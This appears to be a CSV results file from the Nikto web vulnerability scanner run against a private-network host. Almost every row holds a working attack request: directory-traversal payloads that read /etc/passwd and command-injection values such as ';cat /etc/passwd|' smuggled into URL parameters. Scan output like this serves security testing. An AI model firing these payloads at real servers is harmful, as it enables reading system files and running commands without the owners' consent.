"Nikto - v2.1.6/2.1.5"
"192.168.1.142","192.168.1.142","3000","OSVDB-56290","GET","/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd","EditTag allows arbitrary file retrieval."
"192.168.1.142","192.168.1.142","3000","OSVDB-8983","GET","/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1","Remote file retrieval."
"192.168.1.142","192.168.1.142","3000","OSVDB-16861","GET","/athenareg.php?pass=%20;cat%20/etc/passwd","Athena web registration remote command execution."
"192.168.1.142","192.168.1.142","3000","OSVDB-278","GET","/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd","This default Netscape file allows an attacker to read arbitrary files on the host."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/search?NS-query-pat=../../../../../../../../../../etc/passwd","The iPlanet server allows arbitrary files to be retrieved through the search functionality. Install 4.1 SP10+ or 6.0 SP3+"
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/../../../../../../../../../../etc/passwd","It is possible to read files on the server by adding ../ in front of file name."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/................../etc/passwd","The web server allows the password file to be retrieved."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","Web server allows reading of files by sending encoded '../' requests. This server may be Boa (boa.org)."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd","It is possible to read files on the server by adding through directory traversal by adding multiple /\\.. in front of file name."
"192.168.1.142","192.168.1.142","3000","OSVDB-0","GET","/perl/-e%20%22system('cat%20/etc/passwd');\%22","The installed Perl interpreter allows any command to be executed remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-8956","GET","/basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=sec&password=secu","Remote file retrieval."
"192.168.1.142","192.168.1.142","3000","OSVDB-8193","GET","/index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc/&view=passwd","EW FileManager for PostNuke allows arbitrary file retrieval."
"192.168.1.142","192.168.1.142","3000","OSVDB-2713","GET","/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../etc/passwd","The JRUN view_source.jsp allows arbitrary file retrieval from the host. Upgrade to JRUN 2.3.3 or higher, or remove all default scripts. CVE-2000-0540. BID-1386."
"192.168.1.142","192.168.1.142","3000","OSVDB-2793","GET","/.../.../.../.../.../.../.../.../.../.../etc/passwd","TelCondex SimpleWebserver 2.13.31027 and below allows directory traversal."
"192.168.1.142","192.168.1.142","3000","OSVDB-3092","GET","/login/","This might be interesting..."
"192.168.1.142","192.168.1.142","3000","OSVDB-3092","GET","/etc/passwd","An '/etc/passwd' file is available via the web site."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/admbrowse.php?down=1&amp;cur=%2Fetc%2F&amp;dest=passwd&amp;rid=1&amp;S=[someid]","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra.asp?n=....//....//....//....//....//....//....//etc.passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra.asp?n=../../../../../../../../../etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra.asp?n=../../../../../../../../../etc/passwd%00","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra.asp?n=/etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra.asp?n=/etc/passwd%00","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra_professionnel.asp?n=%60/etc/passwd%60","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra_professionnel.asp?n=../../../../../../../../../etc/passwd%00","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra_professionnel.asp?n=/../../../../../../etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra_professionnel.asp?n=/../../../etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra_professionnel.asp?n=/etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum-ra_professionnel.asp?n=/etc/passwd%00","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=%60/etc/passwd%60&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=....//....//....//....//....//....//....//etc.passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=../../../../../../../../../etc/passwd%00&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=/../../../../../../etc/passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=/../../../etc/passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=/etc/passwd%00&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=/etc/passwd&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=1753&amp;nn=%60/etc/passwd%60","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=1753&amp;nn=....//....//....//....//....//....//....//etc.passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=1753&amp;nn=../../../../../../../../../../etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=1753&amp;nn=../../../../../../../../../../etc/passwd%00","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=1753&amp;nn=/etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1.asp?n=1753&amp;nn=/etc/passwd%00","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=%60/etc/passwd%60&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=....//....//....//....//....//....//....//etc.passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=../../../../../../../../../etc/passwd%00&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=/../../../../../../../../etc/passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=/etc/passwd%00&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=/etc/passwd&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=%60/etc/passwd%60&amp;page=1","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=....//....//....//....//....//....//....//etc.passwd&amp;page=1","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=../../../../../../../../../etc/passwd%00&amp;page=1","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=/../../../../../../../../etc/passwd&amp;page=1","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd%00&amp;page=1","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=/etc/passwd&amp;page=1","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=%60/etc/passwd%60","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=....//....//....//....//....//....//....//etc.passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=../../../../../../../../../etc/passwd%00","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/../../../../../../../../../../etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd%00","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/login.php3?reason=chpass2%20","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/mailview.cgi?cmd=view&amp;fldrname=inbox&amp;select=1&amp;html=../../../../../../etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/modif_infos.asp?n=%60/etc/passwd%60","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/modif_infos.asp?n=....//....//....//....//....//....//....//etc.passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/modif_infos.asp?n=../../../../../../../../../etc/passwd%00","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/modif_infos.asp?n=/../../../../../../../../../etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/modif_infos.asp?n=/etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/modif_infos.asp?n=/etc/passwd%00","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/setpasswd.cgi","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/shoutbox/expanded.php?conf=../../../../../../../etc/passwd%20","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/tmp_view.php?file=/etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3093","GET","/userreg.cgi?cmd=insert&amp;lang=eng&amp;tnum=3&amp;fld1=test999%0acat&lt;/var/spool/mail/login&gt;&gt;/etc/passwd","This might be interesting... has been seen in web logs from an unknown scanner."
"192.168.1.142","192.168.1.142","3000","OSVDB-3133","GET","////////../../../../../../etc/passwd","Xerox WorkCentre allows any file to be retrieved remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-3233","GET","/lcgi/sys:/novonyx/suitespot/docs/sewse/misc/test.jse","Novell Netware 5.1 contains Novonyx default files which reveal system information. All default files should be removed."
"192.168.1.142","192.168.1.142","3000","OSVDB-3396","GET","/mylog.html?screen=/etc/passwd","Remote file read vulnerability 1999-0068"
"192.168.1.142","192.168.1.142","3000","OSVDB-3396","GET","/mylog.phtml?screen=/etc/passwd","Remote file read vulnerability 1999-0068"
"192.168.1.142","192.168.1.142","3000","OSVDB-3396","GET","/php/mylog.html?screen=/etc/passwd","Remote file read vulnerability 1999-0346"
"192.168.1.142","192.168.1.142","3000","OSVDB-3396","GET","/php/mylog.phtml?screen=/etc/passwd","Remote file read vulnerability 1999-0346"
"192.168.1.142","192.168.1.142","3000","OSVDB-3396","GET","/fi?/etc/passwd","Remote file read vulnerability 1999-0346"
"192.168.1.142","192.168.1.142","3000","OSVDB-3407","GET","/directory.php?dir=%3Bcat%20/etc/passwd","Marcus S. Xenakis directory.php script allows for command execution. CVE-2002-0434."
"192.168.1.142","192.168.1.142","3000","OSVDB-3410","GET","/content/base/build/explorer/none.php?..:..:..:..:..:..:..:etc:passwd:","SunPS iRunbook Version 2.5.2 allows files to be read remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-3410","GET","/content/base/build/explorer/none.php?/etc/passwd","SunPS iRunbook Version 2.5.2 allows files to be read remotely."
"192.168.1.142","192.168.1.142","3000","OSVDB-3412","GET","/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-3412","GET","/postnuke/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-3412","GET","/postnuke/html/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-3412","GET","/modules/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-3412","GET","/phpBB/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-3412","GET","/forum/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK","PHP-Nuke is vulnerable to a remote file retrieval vuln. It should be upgraded to the latest version. CVE-2001-0320"
"192.168.1.142","192.168.1.142","3000","OSVDB-3487","GET","/lcgi/ndsobj.nlm","Novell Netware 5.1 contains a buffer overflow, also, if Groupwise is enabled remote enumeration of users, groups and system information might be possible.CVE-2001-1233"
"192.168.1.142","192.168.1.142","3000","OSVDB-3566","GET","/shop/normal_html.cgi?file=../../../../../../etc/issue%00","Happymail E-Commerce 4.3/4.4 allows arbitrary files to be retrieved remotely. CVE-2003-0243."
"192.168.1.142","192.168.1.142","3000","OSVDB-3566","GET","/shop/normal_html.cgi?file=;cat%20/etc/passwd|","Happymail E-Commerce 4.3/4.4 allows arbitrary commands to be executed remotely. CVE-2003-0243."
"192.168.1.142","192.168.1.142","3000","OSVDB-3566","GET","/shop/normal_html.cgi?file=|cat%20/etc/passwd|","Happymail E-Commerce 4.3/4.4 allows arbitrary commands to be executed remotely. CVE-2003-0243."
"192.168.1.142","192.168.1.142","3000","OSVDB-3567","GET","/shop/member_html.cgi?file=;cat%20/etc/passwd|","Happymail E-Commerce 4.3/4.4 allows arbitrary commands to be executed remotely. CVE-2003-0243."
"192.168.1.142","192.168.1.142","3000","OSVDB-3567","GET","/shop/member_html.cgi?file=|cat%20/etc/passwd|","Happymail E-Commerce 4.3/4.4 allows arbitrary commands to be executed remotely. CVE-2003-0243."
"192.168.1.142","192.168.1.142","3000","OSVDB-3800","GET","/3rdparty/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00","phpMyAdmin is vulnerable to a directory traversal attack."
"192.168.1.142","192.168.1.142","3000","OSVDB-3800","GET","/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00","phpMyAdmin is vulnerable to a directory traversal attack."
"192.168.1.142","192.168.1.142","3000","OSVDB-3800","GET","/3rdparty/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00","phpMyAdmin is vulnerable to a directory traversal attack."
